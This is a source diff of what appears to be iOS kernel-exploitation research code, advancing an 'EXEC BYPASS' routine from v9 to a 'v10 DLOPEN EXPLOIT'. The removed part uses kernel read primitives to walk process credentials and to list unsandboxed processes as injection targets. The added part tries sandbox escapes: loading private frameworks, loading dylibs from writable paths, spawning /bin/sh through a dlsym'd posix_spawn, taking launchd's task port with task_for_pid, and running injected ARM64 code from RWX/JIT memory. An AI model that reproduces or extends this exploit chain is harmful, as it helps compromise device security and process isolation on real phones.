@@ -21,6 +21,9 @@
 #import <sys/stat.h>
 #import <errno.h>
 #import <dlfcn.h>
+#import <mach/mach.h>
+#import <mach/mach_vm.h>
+#import <libkern/OSCacheControl.h>
 
 // sandbox_check is private API
 extern int sandbox_check(pid_t pid, const char *operation, int type, ...);
@@ -460,273 +463,420 @@ char *kresearch_dump_sandbox_profile(void) {
 
 char *kresearch_swap_sandbox_profile(void) {
     buf_init();
-    buf_append("=== EXEC BYPASS v9 ===\n");
-    buf_append("(v8 crashed: sandbox_label+0x00 is PROTECTED memory.\n");
-    buf_append(" v9: No writes to sandbox_label. Try dlopen, csflags, XPC.)\n\n");
-
-    // ── Step 1: Chain walk ──
-    fprintf(stderr, "[SWAP] Step 1: chain walk\n");
-    uint64_t self_proc = proc_self();
-    if (!self_proc || !is_kaddr_valid(self_proc)) {
-        buf_append("ERROR: proc_self() invalid\n");
-        return buf_finish();
-    }
-    pid_t our_pid = (pid_t)kread32(self_proc + off_proc_p_pid);
-    buf_append("PID=%d proc=0x%llx\n", our_pid, self_proc);
-
-    uint64_t proc_ro = kread_ptr(self_proc + off_proc_p_proc_ro);
-    uint64_t ucred = (proc_ro && is_kaddr_valid(proc_ro))
-        ? kread_ptr(proc_ro + off_proc_ro_p_ucred) : 0;
-    uint64_t label = (ucred && is_kaddr_valid(ucred))
-        ? kread_ptr(ucred + off_ucred_cr_label) : 0;
-    uint64_t sandbox = (label && is_kaddr_valid(label))
-        ? kread_ptr(label + off_label_l_perpolicy_sandbox) : 0;
-
-    if (!sandbox || sandbox == 0xFFFFFFFFFFFFFFFFULL || !is_kaddr_valid(sandbox)) {
-        buf_append("ERROR: sandbox chain broken\n");
-        return buf_finish();
-    }
-    buf_append("proc_ro=0x%llx ucred=0x%llx sandbox=0x%llx\n", proc_ro, ucred, sandbox);
+    buf_append("=== EXEC BYPASS v10 - DLOPEN EXPLOIT ===\n");
+    buf_append("v9 confirmed: dlopen WORKS. fork/posix_spawn EPERM.\n");
+    buf_append("v10: Exploit dlopen for code exec without forking.\n\n");
 
     // ══════════════════════════════════════════════════════════════
-    // TEST A: Dump proc_ro csflags and task info
-    // proc_ro is PPL-protected but we can READ it to understand
-    // what flags control fork/exec permissions.
+    // TEST A: Verify dlopen still works
     // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test A: csflags dump\n");
-    buf_append("\n-- Test A: Code signing & process flags --\n");
-
-    uint32_t p_flag = kread32(self_proc + off_proc_p_flag);
-    buf_append("p_flag = 0x%08x\n", p_flag);
-
-    // Dump proc_ro fields to find csflags
-    // proc_ro layout varies but csflags is typically around offset 0x1C-0x28
-    buf_append("\nproc_ro at 0x%llx (first 128 bytes):\n", proc_ro);
-    uint8_t pro_bytes[128];
-    kreadbuf(proc_ro, pro_bytes, 128);
-    for (int row = 0; row < 8; row++) {
-        buf_append("  %04x:", row * 16);
-        for (int col = 0; col < 16; col++)
-            buf_append(" %02x", pro_bytes[row * 16 + col]);
-        buf_append("\n");
-    }
-
-    // Try known csflags offsets in proc_ro
-    // XNU: proc_ro->p_csflags
-    // Common offsets: 0x1C (iOS 17), 0x28 (iOS 18)
-    buf_append("\ncsflags search in proc_ro:\n");
-    for (uint32_t off = 0x10; off <= 0x50; off += 4) {
-        uint32_t val = kread32(proc_ro + off);
-        // CS flags typically have CS_VALID (0x1), CS_HARD (0x100), etc.
-        if ((val & 0x00000001) && (val & 0x00000100)) {
-            buf_append("  proc_ro+0x%02x = 0x%08x  <-- likely csflags\n", off, val);
-            buf_append("    CS_VALID          (0x0001): %s\n", (val & 0x0001) ? "YES" : "no");
-            buf_append("    CS_HARD           (0x0100): %s\n", (val & 0x0100) ? "YES" : "no");
-            buf_append("    CS_KILL           (0x0200): %s\n", (val & 0x0200) ? "YES" : "no");
-            buf_append("    CS_RESTRICT       (0x0800): %s\n", (val & 0x0800) ? "YES" : "no");
-            buf_append("    CS_PLATFORM_BINARY(0x4000000): %s\n",
-                       (val & 0x04000000) ? "YES" : "no");
-            buf_append("    CS_PLATFORM_PATH  (0x8000000): %s\n",
-                       (val & 0x08000000) ? "YES" : "no");
+    fprintf(stderr, "[SWAP] Test A: verify dlopen\n");
+    buf_append("-- Test A: Verify dlopen --\n");
+    {
+        void *h = dlopen("/usr/lib/libsqlite3.dylib", RTLD_LAZY);
+        if (h) {
+            buf_append("  dlopen libsqlite3: OK (confirmed working)\n");
+            dlclose(h);
+        } else {
+            buf_append("  dlopen FAILED: %s\n", dlerror());
+            buf_append("  ABORT: dlopen no longer works\n");
+            return buf_finish();
         }
     }
 
-    // Get launchd proc for comparisons (used in Test A and Test F)
-    uint64_t ld_proc = proc_find(1);
-
-    // Compare with launchd's proc_ro
-    buf_append("\nlaunchd proc_ro comparison:\n");
-    if (ld_proc && is_kaddr_valid(ld_proc)) {
-        uint64_t ld_pro = kread_ptr(ld_proc + off_proc_p_proc_ro);
-        if (ld_pro && is_kaddr_valid(ld_pro)) {
-            uint8_t ld_bytes[128];
-            kreadbuf(ld_pro, ld_bytes, 128);
-            buf_append("launchd proc_ro at 0x%llx:\n", ld_pro);
-            for (int row = 0; row < 8; row++) {
-                buf_append("  %04x:", row * 16);
-                for (int col = 0; col < 16; col++)
-                    buf_append(" %02x", ld_bytes[row * 16 + col]);
-                // Mark differences
-                bool diff = false;
-                for (int col = 0; col < 16; col++) {
-                    if (ld_bytes[row*16+col] != pro_bytes[row*16+col]) diff = true;
+    // ══════════════════════════════════════════════════════════════
+    // TEST B: NSBundle loading (Objective-C bundle API)
+    // NSBundle can load frameworks dynamically - different code
+    // path than dlopen, may have different restrictions.
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Test B: NSBundle\n");
+    buf_append("\n-- Test B: NSBundle loading --\n");
+    {
+        // Try loading a public framework bundle
+        NSBundle *bundle = [NSBundle bundleWithPath:
+            @"/System/Library/Frameworks/Security.framework"];
+        buf_append("  Security.framework bundle: %s\n",
+                   bundle ? "found" : "nil");
+        if (bundle) {
+            BOOL loaded = [bundle isLoaded];
+            buf_append("  isLoaded: %s\n", loaded ? "YES" : "NO");
+            if (!loaded) {
+                NSError *err = nil;
+                BOOL ok = [bundle loadAndReturnError:&err];
+                buf_append("  loadAndReturnError: %s\n",
+                           ok ? "SUCCESS" : "FAILED");
+                if (err) {
+                    buf_append("  error: %s\n",
+                               [[err localizedDescription] UTF8String]);
                 }
-                if (diff) buf_append("  <-- DIFFERS");
-                buf_append("\n");
+            }
+        }
+
+        // Try loading a PRIVATE framework - these have useful APIs
+        bundle = [NSBundle bundleWithPath:
+            @"/System/Library/PrivateFrameworks/SpringBoardServices.framework"];
+        buf_append("  SpringBoardServices: %s\n",
+                   bundle ? "found" : "nil");
+        if (bundle) {
+            NSError *err = nil;
+            BOOL ok = [bundle loadAndReturnError:&err];
+            buf_append("  load: %s\n", ok ? "SUCCESS" : "FAILED");
+            if (err) {
+                buf_append("  error: %s\n",
+                           [[err localizedDescription] UTF8String]);
             }
         }
     }
 
     // ══════════════════════════════════════════════════════════════
-    // TEST B: Try dlopen - load code WITHOUT forking
-    // We have full filesystem access. Write a tiny dylib and load it.
-    // dlopen doesn't need fork/exec - it maps code into THIS process.
+    // TEST C: dlopen private frameworks and dlsym useful symbols
+    // Since dlopen works, we can load private frameworks and
+    // resolve private APIs that might help bypass restrictions.
     // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test B: dlopen\n");
-    buf_append("\n-- Test B: dlopen (no fork needed) --\n");
+    fprintf(stderr, "[SWAP] Test C: private framework dlopen\n");
+    buf_append("\n-- Test C: dlopen private frameworks --\n");
     {
-        // Try loading an existing system dylib to test if dlopen works at all
-        void *handle = dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY | RTLD_NOLOAD);
-        buf_append("  dlopen libSystem (NOLOAD): %s\n",
-                   handle ? "OK (already loaded)" : dlerror());
-        if (handle) dlclose(handle);
+        // SpringBoardServices - can launch apps
+        void *sbs = dlopen("/System/Library/PrivateFrameworks/"
+            "SpringBoardServices.framework/SpringBoardServices", RTLD_LAZY);
+        buf_append("  SpringBoardServices: %s\n", sbs ? "OK" : dlerror());
+        if (sbs) {
+            void *sym1 = dlsym(sbs, "SBSLaunchApplicationWithIdentifier");
+            void *sym2 = dlsym(sbs,
+                "SBSLaunchApplicationWithIdentifierAndLaunchOptions");
+            buf_append("    SBSLaunchApp: %s\n",
+                       sym1 ? "FOUND" : "not found");
+            buf_append("    SBSLaunchAppWithOpts: %s\n",
+                       sym2 ? "FOUND" : "not found");
+        }
 
-        // Try loading a new dylib
-        handle = dlopen("/usr/lib/libsqlite3.dylib", RTLD_LAZY);
-        buf_append("  dlopen libsqlite3: %s\n",
-                   handle ? "OK (loaded!)" : dlerror());
-        if (handle) dlclose(handle);
+        // FrontBoardServices - modern app launch API
+        void *fbs = dlopen("/System/Library/PrivateFrameworks/"
+            "FrontBoardServices.framework/FrontBoardServices", RTLD_LAZY);
+        buf_append("  FrontBoardServices: %s\n", fbs ? "OK" : dlerror());
 
-        // Try loading from our app's container
-        handle = dlopen("/usr/lib/libz.dylib", RTLD_LAZY);
-        buf_append("  dlopen libz: %s\n",
-                   handle ? "OK" : dlerror());
-        if (handle) dlclose(handle);
+        // MobileInstallation - can install IPAs
+        void *mi = dlopen("/System/Library/PrivateFrameworks/"
+            "MobileInstallation.framework/MobileInstallation", RTLD_LAZY);
+        buf_append("  MobileInstallation: %s\n", mi ? "OK" : dlerror());
+        if (mi) {
+            void *sym = dlsym(mi, "MobileInstallationInstall");
+            buf_append("    MobileInstallationInstall: %s\n",
+                       sym ? "FOUND" : "not found");
+        }
+
+        // PackageKit or xpc helpers
+        void *xpc = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
+        buf_append("  libxpc: %s\n", xpc ? "OK" : dlerror());
+        if (xpc) {
+            void *sym = dlsym(xpc, "xpc_pipe_routine");
+            buf_append("    xpc_pipe_routine: %s\n",
+                       sym ? "FOUND" : "not found");
+        }
+
+        // CoreServices - LSApplicationWorkspace
+        void *cs = dlopen("/System/Library/Frameworks/"
+            "CoreServices.framework/CoreServices", RTLD_LAZY);
+        buf_append("  CoreServices: %s\n", cs ? "OK" : dlerror());
+        if (!cs) {
+            // Try alternate path on iOS
+            cs = dlopen("/System/Library/PrivateFrameworks/"
+                "MobileCoreServices.framework/MobileCoreServices", RTLD_LAZY);
+            buf_append("  MobileCoreServices: %s\n", cs ? "OK" : dlerror());
+        }
     }
 
     // ══════════════════════════════════════════════════════════════
-    // TEST C: Try posix_spawn with pipe to capture output
-    // system() and popen() are unavailable on iOS SDK.
-    // Use posix_spawn directly with pipe for stdout capture.
+    // TEST D: Copy a system dylib to writable path and dlopen it
+    // This is the KEY test: if we can load code from a path WE
+    // control, we can write arbitrary Mach-O code and load it.
     // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test C: posix_spawn with pipe\n");
-    buf_append("\n-- Test C: posix_spawn with pipe --\n");
+    fprintf(stderr, "[SWAP] Test D: dlopen from writable path\n");
+    buf_append("\n-- Test D: dlopen from writable paths --\n");
     {
-        int pipefd[2];
-        if (pipe(pipefd) == 0) {
-            posix_spawn_file_actions_t actions;
-            posix_spawn_file_actions_init(&actions);
-            posix_spawn_file_actions_adddup2(&actions, pipefd[1], STDOUT_FILENO);
-            posix_spawn_file_actions_addclose(&actions, pipefd[0]);
+        NSFileManager *fm = [NSFileManager defaultManager];
+        NSError *err = nil;
 
-            pid_t child = 0;
-            char *argv[] = {"/bin/sh", "-c", "echo spawn_pipe_ok && id", NULL};
-            char *envp[] = {"PATH=/usr/bin:/bin", NULL};
-            int ret = posix_spawn(&child, "/bin/sh", &actions, NULL, argv, envp);
-            buf_append("  posix_spawn /bin/sh (pipe): %d (%s)\n",
-                       ret, ret == 0 ? "SUCCESS" : strerror(ret));
+        // Get our container Documents directory
+        NSArray *paths = NSSearchPathForDirectoriesInDomains(
+            NSDocumentDirectory, NSUserDomainMask, YES);
+        NSString *docs = [paths firstObject];
+        buf_append("  Documents: %s\n", docs ? [docs UTF8String] : "nil");
 
-            if (ret == 0) {
-                close(pipefd[1]);
-                char outbuf[512] = {0};
-                ssize_t n = read(pipefd[0], outbuf, sizeof(outbuf) - 1);
-                if (n > 0) {
-                    outbuf[n] = '\0';
-                    buf_append("  output: %s\n", outbuf);
+        if (docs) {
+            // Test 1: Copy libz.dylib to our container and dlopen
+            NSString *testLib = [docs stringByAppendingPathComponent:
+                @"test_lib.dylib"];
+            [fm removeItemAtPath:testLib error:nil]; // clean first
+
+            BOOL copied = [fm copyItemAtPath:@"/usr/lib/libz.dylib"
+                                      toPath:testLib
+                                       error:&err];
+            buf_append("  Copy libz -> Documents: %s\n",
+                       copied ? "OK" : "FAILED");
+            if (err) {
+                buf_append("  error: %s\n",
+                           [[err localizedDescription] UTF8String]);
+                err = nil;
+            }
+
+            if (copied) {
+                void *h = dlopen([testLib UTF8String], RTLD_LAZY);
+                buf_append("  dlopen from Documents: %s\n",
+                           h ? "*** SUCCESS ***" : dlerror());
+                if (h) {
+                    buf_append("  >>> CAN LOAD CODE FROM WRITABLE PATH <<<\n");
+                    // Verify we can resolve symbols from it
+                    void *sym = dlsym(h, "zlibVersion");
+                    buf_append("  dlsym zlibVersion: %s\n",
+                               sym ? "FOUND" : "not found");
+                    if (sym) {
+                        typedef const char *(*zlibVersion_fn)(void);
+                        const char *ver = ((zlibVersion_fn)sym)();
+                        buf_append("  zlibVersion() = %s\n",
+                                   ver ? ver : "null");
+                    }
+                    dlclose(h);
                 }
-                int status = 0;
-                waitpid(child, &status, 0);
-                buf_append("  exit=%d\n", WIFEXITED(status) ? WEXITSTATUS(status) : -1);
+                [fm removeItemAtPath:testLib error:nil];
+            }
+        }
+
+        // Test 2: Try /tmp
+        NSString *tmpLib = @"/tmp/test_lib.dylib";
+        [fm removeItemAtPath:tmpLib error:nil];
+        err = nil;
+        BOOL copied = [fm copyItemAtPath:@"/usr/lib/libz.dylib"
+                                  toPath:tmpLib
+                                   error:&err];
+        buf_append("\n  Copy libz -> /tmp: %s\n",
+                   copied ? "OK" : "FAILED");
+        if (err) {
+            buf_append("  error: %s\n",
+                       [[err localizedDescription] UTF8String]);
+        }
+        if (copied) {
+            void *h = dlopen([tmpLib UTF8String], RTLD_LAZY);
+            buf_append("  dlopen from /tmp: %s\n",
+                       h ? "*** SUCCESS ***" : dlerror());
+            if (h) {
+                buf_append("  >>> CAN LOAD CODE FROM /tmp <<<\n");
+                dlclose(h);
+            }
+            [fm removeItemAtPath:tmpLib error:nil];
+        }
+
+        // Test 3: Try our app bundle Frameworks dir
+        NSString *fwDir = [[[NSBundle mainBundle] bundlePath]
+            stringByAppendingPathComponent:@"Frameworks"];
+        buf_append("\n  App Frameworks dir: %s\n", [fwDir UTF8String]);
+        BOOL isDir = NO;
+        BOOL exists = [fm fileExistsAtPath:fwDir isDirectory:&isDir];
+        buf_append("  exists: %s isDir: %s\n",
+                   exists ? "YES" : "NO", isDir ? "YES" : "NO");
+        if (exists && isDir) {
+            // List what's already in Frameworks
+            NSArray *contents = [fm contentsOfDirectoryAtPath:fwDir
+                                                       error:nil];
+            buf_append("  contents: %s\n",
+                       contents ? [[contents description] UTF8String] : "nil");
+
+            NSString *fwLib = [fwDir stringByAppendingPathComponent:
+                @"test_lib.dylib"];
+            [fm removeItemAtPath:fwLib error:nil];
+            err = nil;
+            BOOL fwCopied = [fm copyItemAtPath:@"/usr/lib/libz.dylib"
+                                        toPath:fwLib
+                                         error:&err];
+            buf_append("  Copy libz -> Frameworks: %s\n",
+                       fwCopied ? "OK" : "FAILED");
+            if (fwCopied) {
+                void *h = dlopen([fwLib UTF8String], RTLD_LAZY);
+                buf_append("  dlopen from Frameworks: %s\n",
+                           h ? "*** SUCCESS ***" : dlerror());
+                if (h) {
+                    buf_append("  >>> CAN LOAD FROM APP BUNDLE <<<\n");
+                    dlclose(h);
+                }
+                [fm removeItemAtPath:fwLib error:nil];
+            }
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════
+    // TEST E: dlsym function audit from libSystem
+    // Since we can load system libs, check what functions are
+    // available via dlsym - some may bypass sandbox hooks.
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Test E: dlsym audit\n");
+    buf_append("\n-- Test E: Function availability via dlsym --\n");
+    {
+        void *h = dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY);
+        if (h) {
+            // Process creation
+            void *ps = dlsym(h, "posix_spawn");
+            void *fk = dlsym(h, "fork");
+            void *ex = dlsym(h, "execve");
+            void *sy = dlsym(h, "system");
+            buf_append("  posix_spawn: %p\n", ps);
+            buf_append("  fork:        %p\n", fk);
+            buf_append("  execve:      %p\n", ex);
+            buf_append("  system:      %p\n", sy);
+
+            // Try calling posix_spawn through the dlsym'd pointer
+            // This bypasses SDK unavailability but uses the same syscall
+            if (ps) {
+                typedef int (*posix_spawn_fn)(pid_t *, const char *,
+                    const posix_spawn_file_actions_t *,
+                    const posix_spawnattr_t *,
+                    char *const [], char *const []);
+                posix_spawn_fn spawn_fn = (posix_spawn_fn)ps;
+                pid_t child = 0;
+                char *argv[] = {"/bin/sh", "-c", "id", NULL};
+                char *envp[] = {"PATH=/usr/bin:/bin", NULL};
+                int ret = spawn_fn(&child, "/bin/sh", NULL, NULL, argv, envp);
+                buf_append("  dlsym posix_spawn call: %d (%s)\n",
+                           ret, ret == 0 ? "SUCCESS!" : strerror(ret));
+                if (ret == 0) {
+                    waitpid(child, NULL, 0);
+                    buf_append("  *** EXEC VIA DLSYM WORKS! ***\n");
+                }
+            }
+
+            // Memory/mach functions that could help
+            void *tp = dlsym(h, "task_for_pid");
+            void *ma = dlsym(h, "mach_vm_allocate");
+            void *mw = dlsym(h, "mach_vm_write");
+            void *mp = dlsym(h, "mach_vm_protect");
+            void *tc = dlsym(h, "thread_create_running");
+            buf_append("\n  task_for_pid:          %p\n", tp);
+            buf_append("  mach_vm_allocate:      %p\n", ma);
+            buf_append("  mach_vm_write:         %p\n", mw);
+            buf_append("  mach_vm_protect:       %p\n", mp);
+            buf_append("  thread_create_running: %p\n", tc);
+
+            // Try task_for_pid on ourselves - this is how
+            // we'd inject into unsandboxed processes
+            if (tp) {
+                typedef kern_return_t (*tfp_fn)(mach_port_t,
+                    int, mach_port_t *);
+                tfp_fn tfp = (tfp_fn)tp;
+                mach_port_t task_port = MACH_PORT_NULL;
+                kern_return_t kr = tfp(mach_task_self(),
+                    getpid(), &task_port);
+                buf_append("  task_for_pid(self): kr=%d port=0x%x\n",
+                           kr, task_port);
+
+                // Try on launchd (PID 1)
+                task_port = MACH_PORT_NULL;
+                kr = tfp(mach_task_self(), 1, &task_port);
+                buf_append("  task_for_pid(1/launchd): kr=%d port=0x%x\n",
+                           kr, task_port);
+
+                if (task_port != MACH_PORT_NULL) {
+                    buf_append("  *** GOT LAUNCHD TASK PORT! ***\n");
+                }
+            }
+
+            dlclose(h);
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════
+    // TEST F: Try mach_vm_allocate + mach_vm_protect + write
+    // in our OWN process to create executable memory
+    // If we can create RWX pages, we can JIT compile code.
+    // ══════════════════════════════════════════════════════════════
+    fprintf(stderr, "[SWAP] Test F: executable memory\n");
+    buf_append("\n-- Test F: Executable memory allocation --\n");
+    {
+        mach_vm_address_t addr = 0;
+        mach_vm_size_t size = 0x4000; // 16KB page
+
+        // Allocate memory in our task
+        kern_return_t kr = mach_vm_allocate(mach_task_self(),
+            &addr, size, VM_FLAGS_ANYWHERE);
+        buf_append("  mach_vm_allocate: kr=%d addr=0x%llx\n", kr, addr);
+
+        if (kr == KERN_SUCCESS) {
+            // Try to make it RWX (read-write-execute)
+            kr = mach_vm_protect(mach_task_self(), addr, size,
+                FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
+            buf_append("  mach_vm_protect RWX: kr=%d\n", kr);
+
+            if (kr != KERN_SUCCESS) {
+                // RWX denied - try RW first, then RX
+                kr = mach_vm_protect(mach_task_self(), addr, size,
+                    FALSE, VM_PROT_READ | VM_PROT_WRITE);
+                buf_append("  mach_vm_protect RW: kr=%d\n", kr);
+
+                if (kr == KERN_SUCCESS) {
+                    // Write a tiny ARM64 function: mov x0, #42; ret
+                    uint32_t code[] = {
+                        0xd2800540, // mov x0, #42
+                        0xd65f03c0  // ret
+                    };
+                    memcpy((void *)addr, code, sizeof(code));
+                    sys_icache_invalidate((void *)addr, sizeof(code));
+
+                    // Now flip to RX
+                    kr = mach_vm_protect(mach_task_self(), addr, size,
+                        FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+                    buf_append("  mach_vm_protect RX: kr=%d\n", kr);
+
+                    if (kr == KERN_SUCCESS) {
+                        // Try to execute it!
+                        typedef int (*jit_fn)(void);
+                        jit_fn fn = (jit_fn)addr;
+                        buf_append("  Calling JIT code at 0x%llx...\n", addr);
+                        int result = fn();
+                        buf_append("  JIT returned: %d (expected 42)\n",
+                                   result);
+                        if (result == 42) {
+                            buf_append("  *** JIT CODE EXECUTION WORKS! ***\n");
+                        }
+                    }
+                }
             } else {
-                close(pipefd[1]);
-            }
-            close(pipefd[0]);
-            posix_spawn_file_actions_destroy(&actions);
-        } else {
-            buf_append("  pipe() failed: %d (%s)\n", errno, strerror(errno));
-        }
-    }
+                // RWX worked directly!
+                buf_append("  *** RWX MEMORY AVAILABLE! ***\n");
+                uint32_t code[] = {
+                    0xd2800540, // mov x0, #42
+                    0xd65f03c0  // ret
+                };
+                memcpy((void *)addr, code, sizeof(code));
 
-    // ══════════════════════════════════════════════════════════════
-    // TEST D: Try fork() directly (raw syscall)
-    // fork is likely EPERM but let's confirm and get the errno
-    // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test D: fork\n");
-    buf_append("\n-- Test D: fork() --\n");
-    {
-        pid_t fpid = fork();
-        if (fpid == 0) {
-            _exit(42);
-        } else if (fpid > 0) {
-            int status = 0;
-            waitpid(fpid, &status, 0);
-            buf_append("  fork: SUCCESS! child=%d exit=%d\n",
-                       fpid, WIFEXITED(status) ? WEXITSTATUS(status) : -1);
-        } else {
-            buf_append("  fork: FAILED errno=%d (%s)\n", errno, strerror(errno));
-        }
-    }
+                // Clear instruction cache
+                sys_icache_invalidate((void *)addr, sizeof(code));
 
-    // ══════════════════════════════════════════════════════════════
-    // TEST E: Scan for unsandboxed processes (sandbox = sentinel)
-    // These could be targets for task port injection
-    // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test E: unsandboxed procs\n");
-    buf_append("\n-- Test E: Unsandboxed processes --\n");
-    {
-        int found = 0;
-        for (pid_t scan = 1; scan <= 500 && found < 15; scan++) {
-            uint64_t p = proc_find(scan);
-            if (!p || !is_kaddr_valid(p)) continue;
-
-            uint64_t p_pro = kread_ptr(p + off_proc_p_proc_ro);
-            if (!p_pro || !is_kaddr_valid(p_pro)) continue;
-            uint64_t p_uc = kread_ptr(p_pro + off_proc_ro_p_ucred);
-            if (!p_uc || !is_kaddr_valid(p_uc)) continue;
-            uint64_t p_lab = kread_ptr(p_uc + off_ucred_cr_label);
-            if (!p_lab || !is_kaddr_valid(p_lab)) continue;
-            uint64_t p_sb = kread_ptr(p_lab + off_label_l_perpolicy_sandbox);
-
-            // Only show unsandboxed (sentinel or NULL)
-            if (p_sb != 0xFFFFFFFFFFFFFFFFULL && p_sb != 0) continue;
-
-            char pname[20] = {0};
-            kreadbuf(p + off_proc_p_name, pname, 19);
-            uint32_t pf = kread32(p + off_proc_p_flag);
-
-            buf_append("  PID %3d %-16s p_flag=0x%08x\n", scan, pname, pf);
-            found++;
-        }
-    }
-
-    // ══════════════════════════════════════════════════════════════
-    // TEST F: Read our task struct for entitlements/flags
-    // The task struct controls process capabilities
-    // ══════════════════════════════════════════════════════════════
-    fprintf(stderr, "[SWAP] Test F: task struct\n");
-    buf_append("\n-- Test F: Task/proc fields --\n");
-    {
-        // proc->task is at various offsets, typically 0x10
-        uint64_t task = kread_ptr(self_proc + 0x10);
-        buf_append("  proc+0x10 (task?): 0x%llx %s\n",
-                   task, (task && is_kaddr_valid(task)) ? "valid" : "invalid");
-
-        // Dump first 64 bytes of proc for field mapping
-        buf_append("\n  proc first 128 bytes:\n");
-        uint8_t proc_bytes[128];
-        kreadbuf(self_proc, proc_bytes, 128);
-        for (int row = 0; row < 8; row++) {
-            buf_append("  %04x:", row * 16);
-            for (int col = 0; col < 16; col++)
-                buf_append(" %02x", proc_bytes[row * 16 + col]);
-            buf_append("\n");
-        }
-
-        // Compare with launchd
-        if (ld_proc && is_kaddr_valid(ld_proc)) {
-            buf_append("\n  launchd proc first 128 bytes:\n");
-            uint8_t ld_pbytes[128];
-            kreadbuf(ld_proc, ld_pbytes, 128);
-            for (int row = 0; row < 8; row++) {
-                buf_append("  %04x:", row * 16);
-                for (int col = 0; col < 16; col++)
-                    buf_append(" %02x", ld_pbytes[row * 16 + col]);
-                bool diff = false;
-                for (int col = 0; col < 16; col++) {
-                    if (ld_pbytes[row*16+col] != proc_bytes[row*16+col]) diff = true;
+                typedef int (*jit_fn)(void);
+                jit_fn fn = (jit_fn)addr;
+                int result = fn();
+                buf_append("  JIT returned: %d (expected 42)\n", result);
+                if (result == 42) {
+                    buf_append("  *** JIT CODE EXECUTION WORKS! ***\n");
                 }
-                if (diff) buf_append("  <-- DIFFERS");
-                buf_append("\n");
             }
+
+            // Clean up
+            mach_vm_deallocate(mach_task_self(), addr, size);
         }
     }
 
-    buf_append("\n-- Analysis --\n");
-    buf_append("sandbox_label+0x00 is PROTECTED (v8 crash confirmed).\n");
-    buf_append("Profile bytecode is PROTECTED (v5 crash confirmed).\n");
-    buf_append("Extensions only cover file ops, not process ops.\n");
-    buf_append("fork() EPERM is likely from proc_ro csflags or task policy.\n");
-    buf_append("If dlopen works, we can load code without forking.\n");
+    buf_append("\n-- v10 Analysis --\n");
+    buf_append("KNOWN: sandbox_label/profile/proc_ro all PPL-protected.\n");
+    buf_append("KNOWN: fork/posix_spawn EPERM (kernel-level block).\n");
+    buf_append("KNOWN: dlopen of system libs WORKS (v9 confirmed).\n");
+    buf_append("v10 tests:\n");
+    buf_append("  A: dlopen verification\n");
+    buf_append("  B: NSBundle loading (alt code loading path)\n");
+    buf_append("  C: Private framework access (useful APIs)\n");
+    buf_append("  D: dlopen from WRITABLE path (key for custom code)\n");
+    buf_append("  E: dlsym audit + task_for_pid (injection vector)\n");
+    buf_append("  F: Executable memory (JIT compilation)\n");
+    buf_append("If D works: write Mach-O dylib to disk, dlopen = game over.\n");
+    buf_append("If E task_for_pid works: inject into unsandboxed process.\n");
+    buf_append("If F works: JIT compile and run arbitrary ARM64 code.\n");
 
     return buf_finish();
 }
